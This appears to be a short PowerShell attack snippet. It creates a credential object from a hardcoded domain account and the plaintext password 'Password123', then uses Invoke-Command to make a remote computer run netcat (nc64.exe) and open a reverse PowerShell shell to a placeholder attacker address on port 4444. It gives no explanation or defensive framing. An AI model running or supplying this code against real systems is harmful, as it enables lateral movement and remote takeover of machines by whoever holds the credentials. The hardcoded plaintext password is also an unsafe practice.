$user = "Domain\User"
$password = ConvertTo-SecureString "Password123" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($user, $password)
Invoke-Command -ComputerName Computer123 -ScriptBlock {C:\temp\nc64.exe x.x.x.x 4444 -e powershell } -Credential $credential
